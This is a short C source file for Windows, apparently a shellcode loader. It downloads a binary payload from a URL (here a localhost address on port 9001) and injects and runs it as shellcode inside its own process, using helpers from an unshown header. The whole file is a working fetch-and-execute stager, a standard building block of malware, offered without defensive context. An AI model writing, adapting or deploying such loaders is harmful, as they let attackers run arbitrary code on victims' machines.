#include <Windows.h>
#include <stdio.h>
#include "payload.h" 

#define PAYLOAD L"http://127.0.0.1:9001/payload.bin"

int main() {
    SIZE_T Size = 0x0;
    PBYTE Bytes = 0x0;
    PBYTE pInjectionAddress = NULL;
    HANDLE hThread = NULL;

    // Fetch the payload from the URL
    if (!FetchFileFromURLW(PAYLOAD, &Bytes, &Size)) {
        printf("[!] FetchFileFromURLW Failed With Error: %lu \n", GetLastError());
        return -1;
    }

    // Execute the shellcode in the local process
    if (!ExecuteShellcodeInLocalProcess(Bytes, Size, &pInjectionAddress, &hThread)) {
        printf("[!] ExecuteShellcodeInLocalProcess Failed With Error: %lu \n", GetLastError());
        if (Bytes) {
            VirtualFree(Bytes, 0, MEM_RELEASE); // Clean up the allocated buffer if needed
        }
        return -1;
    }

    printf("[+] Shellcode successfully injected and executed.\n");

    // Wait for the shellcode execution thread to complete, if needed
    if (hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE);
        CloseHandle(hThread);
    }

    // Cleanup
    if (pInjectionAddress) {
        VirtualFree(pInjectionAddress, 0, MEM_RELEASE);
    }
    if (Bytes) {
        VirtualFree(Bytes, 0, MEM_RELEASE);
    }

    return 0;
}
